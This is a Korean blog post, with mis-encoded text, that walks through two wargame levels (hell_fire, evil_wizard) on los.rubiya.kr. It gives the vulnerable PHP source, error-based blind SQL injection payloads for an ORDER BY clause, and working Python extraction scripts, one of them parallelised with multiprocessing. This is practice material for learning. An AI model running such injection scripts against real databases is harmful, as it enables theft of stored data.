---
title: "[LOS] 23,24ë²ˆ ë¬¸ì œ í’€ì´(hell_fire,evil_wizard)"
categories:
  - los
tags:
  - los
  - rubiya
  - los 23ë²ˆ
  - los 24ë²ˆ
  - los hell_fire
  - los evil_wizard
  - multiproccessing
  - blind sql injection
  
toc: true
toc_sticky: true
toc_label: "23,24ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/sql.png
---

ğŸ’¡ los.rubiya.kr 23ë²ˆ,24ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤. Blind SQL Injectionì„ ë©€í‹°í”„ë¡œì„¸ì‹±ìœ¼ë¡œ ì²˜ë¦¬í•´ ë³´ì•˜ìŠµë‹ˆë‹¤.
{: .notice--warning}



# 23ë²ˆ(hell_fire)
## ë¬¸ì œ
![image](https://user-images.githubusercontent.com/33647663/158282940-1337ec7e-8b07-48b7-84f5-744778543dc3.png)


```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|proc|union/i', $_GET[order])) exit("No Hack ~_~");
  $query = "select id,email,score from prob_hell_fire where 1 order by {$_GET[order]}";
  echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
  $rows = mysqli_query($db,$query);
  while(($result = mysqli_fetch_array($rows))){
    if($result['id'] == "admin") $result['email'] = "**************";
    echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
  }
  echo "</table><hr>query : <strong>{$query}</strong><hr>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_hell_fire where id='admin' and email='{$_GET[email]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['email']) && ($result['email'] === $_GET['email'])) solve("hell_fire");
  highlight_file(__FILE__);
?>
```

## í’€ì´
ì´ë²ˆ ë¬¸ì œëŠ” ì…ë ¥ ê°’ì´ order by ì ˆì— ì…ë ¥ì´ ë©ë‹ˆë‹¤. ì²˜ìŒì— ì‹œë„í•œ ë°©ë²•ì€ if(ì¡°ê±´ë¬¸,1,3) ë°©ì‹ìœ¼ë¡œ, ì¡°ê±´ë¬¸ì˜ ê²°ê³¼ê°€ ì°¸ì´ë©´ 1, ê±°ì§“ì´ë©´ 3ì´ ì¶œë ¥ë˜ê²Œ í•˜ì—¬ ì¡°ê±´ë¬¸ì˜ ê²°ê³¼ë¥¼ íŒë‹¨í•˜ë ¤ê³  í–ˆìŠµë‹ˆë‹¤.

ë‹¤ìŒê³¼ ê°™ì´ order by 1ê³¼ 3ì˜ ê²°ê³¼ê°€ ë‹¤ë¥´ê¸° ë•Œë¬¸ì—, if ë¬¸ì„ ì´ìš©í•˜ë©´ ë  ê±°ë¼ ìƒê°í–ˆìŠµë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/158283362-e98798e8-eed6-4411-b7f8-36bd1c8e084a.png)

---

![image](https://user-images.githubusercontent.com/33647663/158283384-49d90fc4-6ab1-43bd-9126-15be0fedeafa.png)



í•˜ì§€ë§Œ ì´ìœ ëŠ” ì˜ ëª¨ë¥´ê² ëŠ”ë°, order by ì ˆ ë’¤ì—ëŠ” ì„œë¸Œì¿¼ë¦¬ë‚˜, í•¨ìˆ˜ê°€ ì‚¬ìš©ë˜ë©´ ê²°ê³¼ ê°’ê³¼ ìƒê´€ì—†ëŠ” ê²°ê³¼ê°€ ë‚˜ì˜µë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ if(1=1,1,2) ë¼ê³  í•˜ë©´ 1ì´ ë°˜í™˜ë ê±°ë¼ ìƒê°í–ˆì§€ë§Œ, ì œê°€ ìƒê°í•˜ëŠ” ë°©ì‹ëŒ€ë¡œ ì²˜ë¦¬ë˜ì§€ ì•Šê³ , ê²°ê³¼ì™€ ìƒê´€ì—†ì´ ì¼ì •í•˜ê²Œ ì¶œë ¥ì´ ë©ë‹ˆë‹¤.
-> **if(1=1,1,2) ë‚˜ if(1=1,1000,2)ë‚˜ ì¶œë ¥ê²°ê³¼ê°€ ê°™ìŒ**

ê·¸ë˜ì„œ ì´ë²ˆ ë¬¸ì œë„ error based ë°©ì‹ìœ¼ë¡œ ì ‘ê·¼í•´ ë´¤ìŠµë‹ˆë‹¤.

ì°¨ì´ê°€ ë‚˜ëŠ” ì ì€ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì§€ ì•Šìœ¼ë©´ ê²°ê³¼ê°€ ì¶œë ¥ë˜ê³ , ì„œë¸Œ ì¿¼ë¦¬ ë‚´ì—ì„œ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ë©´ ê²°ê³¼ê°€ ì¶œë ¥ë˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ì ì´ì—ˆìŠµë‹ˆë‹¤.

1. order=(select 1 where if(1=1,1,pow(12341234,12341234)))

![image](https://user-images.githubusercontent.com/33647663/158284038-4d57481f-6e6f-4a0c-a519-fe46442ec390.png)

-> **ì¡°ê±´ë¬¸ì´ ì°¸ì¼ë•ŒëŠ”, 1ì´ ì„ íƒë˜ì–´ì„œ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì§€ ì•Šì•„ì„œ í…Œì´ë¸”ì´ ì¶œë ¥ë©ë‹ˆë‹¤.**

2. order=(select 1 where if(1=2,1,pow(12341234,12341234)))

![image](https://user-images.githubusercontent.com/33647663/158284153-774f74ac-dde1-4c4e-b1ca-593fba8eab10.png)

-> **ì¡°ê±´ë¬¸ì´ ê±°ì§“ì¼ë•ŒëŠ”, pow(12341234,12341234)ê°€ ì„ íƒë˜ì–´ ì‹¤í–‰ë˜ê¸° ë•Œë¬¸ì— ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì—¬ í…Œì´ë¸”ì´ ì¶œë ¥ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.**

ì´ë¥¼ ì´ìš©í•œ error based blind sql ì½”ë“œì…ë‹ˆë‹¤.

```python
import requests
import string

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
params={'order' : None}
cookies = {'PHPSESSID' :'1t87momi7f10m7tl6kkv6t0lob' }

# ì´ë©”ì¼ ê¸¸ì´
for i in range(30):
    payload="(select 1 where if(id='admin' and length(email)={},pow(12341234,12341234),1))".format(i)
    params['order'] = payload
    print(payload)
    response = requests.get(url,params=params,cookies=cookies)
    if("rubiya805@gmail.cm" not in response.text):
        print("find the pw_length",i)
        break

# ì´ë©”ì¼ ê¸¸ì´ 28

email = ''
for i in range(1,29):
    for j in string.printable:
        payload="(select 1 where if(id='admin' and ascii(substr(email,{},1))={},pow(12341234,12341234),1))".format(i,ord(j))
        params['order'] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        if("rubiya805@gmail.cm" not in response.text):
            email += j
            print("find the email",email)
            break

print(email)
```

![image](https://user-images.githubusercontent.com/33647663/158287577-ad9c44fe-0dc9-47e8-8a60-00ea4fc5820a.png)

![image](https://user-images.githubusercontent.com/33647663/158287614-dc4c60c0-8b7e-4948-b3e0-250e2c1d86d3.png)


# 24ë²ˆ(evil_wizard)
## ë¬¸ì œ
![image](https://user-images.githubusercontent.com/33647663/158293178-35d5511b-dbe8-4642-bbb2-b3c4a830f352.png)

23ë²ˆ ë¬¸ì œì¸ hell_fireì™€ í•„í„°ë§ëœ ë¬¸ìì—ì„œë§Œ ì°¨ì´ê°€ ìˆê³  ë‚˜ë¨¸ì§„ ì°¨ì´ê°€ ì—†ëŠ” ë¬¸ì œì…ë‹ˆë‹¤.

í•„í„°ë§ì˜ ì°¨ì´ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤

```php
# hell_fire ë¬¸ì œì—ì„œì˜ í•„í„°ë§
if(preg_match('/prob|_|\.|proc|union/i', $_GET[order])) exit("No Hack ~_~");

# evil_wizard ë¬¸ì œì—ì„œì˜ í•„í„°ë§
if(preg_match('/prob|_|\.|proc|union|sleep|benchmark/i', $_GET[order])) exit("No Hack ~_~");
```

sleepê³¼ benchmarkí•¨ìˆ˜ì— ëŒ€í•œ í•„í„°ë§ì´ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤. ì•„ë§ˆ 23ë²ˆì„ Time Based blind SQL Injectionìœ¼ë¡œ í’€ì—ˆë‹¤ë©´ ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ í’€ì–´ì•¼ í• í…ë° ì €ëŠ” Time Based Blind SQL Injectionì´ ì•„ë‹Œ Error basedë¡œ í’€ì—ˆê¸° ë•Œë¬¸ì— í•´ë‹¹ í•„í„°ë§ì— ìƒê´€ì—†ì´ ë™ì¼í•˜ê²Œ ì½”ë“œë¥¼ ì‘ì„±í•˜ë©´ ì •ë‹µì´ ë‚˜ì˜µë‹ˆë‹¤..^

## í’€ì´
ê·¸ëŸ°ë° ì´ë²ˆì—ëŠ” ê¸´ ë¬¸ìì— ëŒ€í•´ì„œ ë©€í‹°í”„ë¡œì„¸ì‹±ì„ ì´ìš©í•˜ì—¬ Blind sql injectionì„ ìˆ˜í–‰í•´ ë´¤ìŠµë‹ˆë‹¤. ë©€í‹°í”„ë¡œì„¸ì‹±ì€ ë³‘ë ¬ì ìœ¼ë¡œ ì²˜ë¦¬í•˜ëŠ” í”„ë¡œì„¸ìŠ¤ì—ì„œ ìˆ˜í–‰í•˜ë©´ ì„±ëŠ¥ì´ ë“œë¼ë§ˆí‹±í•˜ê²Œ í–¥ìƒì´ ë˜ëŠ”ë°, ì—­ì‹œ blind sql injectionì— ì ìš©ì„ í•´ë³´ë‹ˆ 3~4ë°° ì •ë„ëŠ” ë¹ ë¥´ê²Œ ì •ë‹µì„ ì°¾ì•„ëƒˆìŠµë‹ˆë‹¤.

ë‹¤ìŒì€ ë©€í‹° í”„ë¡œì„¸ì‹±ì„ ì´ìš©í•˜ì—¬ ì‘ì„±í•œ ì½”ë“œì…ë‹ˆë‹¤.

```python
from multiprocessing import Pool
import requests
import string

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
params={'order' : None}
cookies = {'PHPSESSID' :'1t87momi7f10m7tl6kkv6t0lob' }

# ì´ë©”ì¼ ê¸¸ì´
for i in range(28,40):
    payload="(select 1 where if(id='admin' and length(email)={},pow(12341234,12341234),1))".format(i)
    params['order'] = payload
    print(payload)
    response = requests.get(url,params=params,cookies=cookies)
    if("rubiya805@gmail.com" not in response.text):
        print("find the pw_length",i)
        break

# ì´ë©”ì¼ ê¸¸ì´ 28

def blind_sql_inject(i):
    for j in string.printable:
        payload="(select 1 where if(id='admin' and ascii(substr(email,{},1))={},pow(12341234,12341234),1))".format(i,ord(j))
        params['order'] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("rubiya805@gmail.com" not in response.text):
            print("find idx : {}, character : {}".format(i,j))
            return j

if __name__=='__main__':
    with Pool(5) as p:
        ret = p.map(blind_sql_inject,[i for i in range(1,31)])
    for i in ret:
        print(i,end='')
         
```

![image](https://user-images.githubusercontent.com/33647663/158293765-b37bb243-21b4-4b04-ad0c-696aea20a4dd.png)

![image](https://user-images.githubusercontent.com/33647663/158293143-6dfafe9c-5ab7-499c-ad71-f696134bc821.png)